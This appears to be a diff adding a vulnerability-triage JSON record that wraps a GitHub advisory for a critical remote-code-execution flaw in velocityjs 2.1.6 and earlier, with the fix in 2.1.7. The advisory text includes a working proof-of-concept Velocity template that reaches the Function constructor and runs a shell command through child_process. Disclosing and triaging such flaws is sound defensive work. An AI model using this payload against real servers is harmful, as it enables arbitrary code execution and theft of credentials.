@@ -1,0 +1,55 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/32502734?v=4\", \"events_url\": \"https://api.github.com/users/cruzryan/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/cruzryan/followers\", \"following_url\": \"https://api.github.com/users/cruzryan/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/cruzryan/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/cruzryan\", \"id\": 32502734, \"login\": \"cruzryan\", \"node_id\": \"MDQ6VXNlcjMyNTAyNzM0\", \"organizations_url\": \"https://api.github.com/users/cruzryan/orgs\", \"received_events_url\": \"https://api.github.com/users/cruzryan/received_events\", \"repos_url\": \"https://api.github.com/users/cruzryan/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/cruzryan/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/cruzryan/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/cruzryan\", \"user_view_type\": \"public\"}}], \"cve_id\": null, \"cvss\": {\"score\": 9.8, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 9.8, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-94\", \"name\": \"Improper Control of Generation of Code ('Code Injection')\"}], \"description\": \"### Summary\\n\\nRemote Code Execution (RCE) in velocityjs v2.1.6 via property-read to the Function constructor. This bypasses the fix for GHSA-j658-c2gf-x6pq (\\\"Prototype Pollution in #set path assignment\\\") — that advisory blocked constructor/__proto__/prototype only in the #set assignment handler (set.cjs), but property read expressions are unfiltered. Any application rendering attacker-controlled Velocity templates is vulnerable to arbitrary code execution on the server.\\n\\n### Details\\n\\nGHSA-j658-c2gf-x6pq added isBlockedPathKey() to dist/cjs/compile/set.cjs:35-43, which blocks __proto__, constructor, and prototype keys. However, this check only runs when the #set directive assigns a value — it validates the assignment target path, not the value expression being evaluated.\\nThe value expression is evaluated via getReferences() in dist/cjs/compile/references.cjs:16, which calls getAttributes() at line 81. The property access at line 88-89 has no filtering:\\n// references.cjs:81-91\\ngetAttributes(property, baseRef, ast) {\\n  if (property.type === \\\"property\\\") {\\n    return baseRef[property.id];  // ← NO BLOCK on \\\"constructor\\\", \\\"prototype\\\", etc.\\n  }\\n  ...\\n}\\nMeanwhile, set.cjs:35-43 properly blocks these keys, but only for the #set target:\\n// set.cjs:35-43\\nisBlockedPathKey(baseRef, key, isEnd) {\\n  if (key === PROTO_KEY) return true;          // \\\"__proto__\\\"\\n  if (key === \\\"prototype\\\" && typeof baseRef === \\\"function\\\") return true;\\n  return !isEnd && PROTOTYPE_CHAIN_KEYS.has(key) && !hasOwnProperty(baseRef, key);\\n}\\nThe exploit chain:\\n1. $x.constructor → getAttributes() → {}[\\\"constructor\\\"] → Object\\n2. .constructor → getAttributes() → Object[\\\"constructor\\\"] → Function\\n3. (\\\"return process.mainModule.require('child_process').execSync('whoami')\\\") → calls Function(...) → creates a function\\n4. The #set assigns the result to $f, which is then rendered as $r\\nThe #set handler validates $f as the assignment target (which passes — f is not blocked), but never inspects the right-hand expression for prototype chain traversal.\\n\\n### PoC\\n\\nconst velocity = require('velocityjs');\\n\\nconst template = \\\"#set($f=$x.constructor.constructor(\\\\\\\"return process.mainModule.require('child_process').execSync('whoami').toString()\\\\\\\"))#set($r=$f())$r\\\";\\n\\nconsole.log(velocity.render(template, { x: {} }));\\n// Output: <current OS username>\\nVerified on velocityjs v2.1.6, Node.js v24.15.0, Windows.\\n\\n### Impact\\n\\nType: Remote Code Execution (RCE)\\n\\nAny application that renders attacker-controlled Velocity templates using velocityjs is vulnerable to full server compromise. The attacker can execute arbitrary shell commands, read environment variables, access cloud credentials, and pivot to internal network resources.\\nThe existing advisory GHSA-j658-c2gf-x6pq established the threat model: \\\"any app rendering attacker-controlled templates.\\\" This finding demonstrates that the fix was incomplete — the #set blocking was added but property read expressions remain unfiltered, making the issue strictly worse (RCE vs prototype pollution).\\n\\n### Patches\\n\\nFixed in [velocityjs 2.1.7](https://www.npmjs.com/package/velocityjs/v/2.1.7). The fix was merged in [pull request #192](https://github.com/shepherdwind/velocity.js/pull/192) and released as [v2.1.7](https://github.com/shepherdwind/velocity.js/releases/tag/v2.1.7). Users should upgrade to version 2.1.7 or later.\", \"ghsa_id\": \"GHSA-7gfh-x38p-prh3\", \"github_reviewed_at\": \"2026-07-24T16:21:22Z\", \"html_url\": \"https://github.com/advisories/GHSA-7gfh-x38p-prh3\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-7gfh-x38p-prh3\"}], \"nvd_published_at\": null, \"published_at\": \"2026-07-24T16:21:22Z\", \"references\": [\"https://github.com/shepherdwind/velocity.js/security/advisories/GHSA-7gfh-x38p-prh3\", \"https://github.com/shepherdwind/velocity.js/pull/192\", \"https://github.com/shepherdwind/velocity.js/commit/f8e47a6c4607249b9c967d3a1ced959b4dd64dba\", \"https://github.com/shepherdwind/velocity.js/releases/tag/v2.1.7\", \"https://github.com/advisories/GHSA-7gfh-x38p-prh3\"], \"repository_advisory_url\": \"https://api.github.com/repos/shepherdwind/velocity.js/security-advisories/GHSA-7gfh-x38p-prh3\", \"severity\": \"critical\", \"source_code_location\": \"https://github.com/shepherdwind/velocity.js\", \"summary\": \"Velocity.js: Remote Code Execution via property-read to Function constructor (bypass of GHSA-j658-c2gf-x6pq fix)\", \"type\": \"reviewed\", \"updated_at\": \"2026-07-24T16:21:23Z\", \"url\": \"https://api.github.com/advisories/GHSA-7gfh-x38p-prh3\", \"vulnerabilities\": [{\"first_patched_version\": \"2.1.7\", \"package\": {\"ecosystem\": \"npm\", \"name\": \"velocityjs\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"<= 2.1.6\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-7gfh-x38p-prh3",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "velocityjs: <= 2.1.6"
+    ],
+    "authentication_required": false,
+    "cves": [],
+    "cvss_score": 9.8,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "velocityjs"
+    ],
+    "remote": true,
+    "vendor_severity": "critical"
+  },
+  "first_seen_at": "2026-07-24T19:36:04.903317Z",
+  "provenance": {
+    "content_sha256": "4d991e7d9e6db959d4f6f5d5ecb47f06032693f0cffa6748d70c97cc334b4dee",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-07-24T16:21:22Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-7gfh-x38p-prh3",
+  "status": "active",
+  "title": "Velocity.js: Remote Code Execution via property-read to Function constructor (bypass of GHSA-j658-c2gf-x6pq fix)",
+  "updated_at": "2026-07-24T16:21:23Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-7gfh-x38p-prh3"
+}
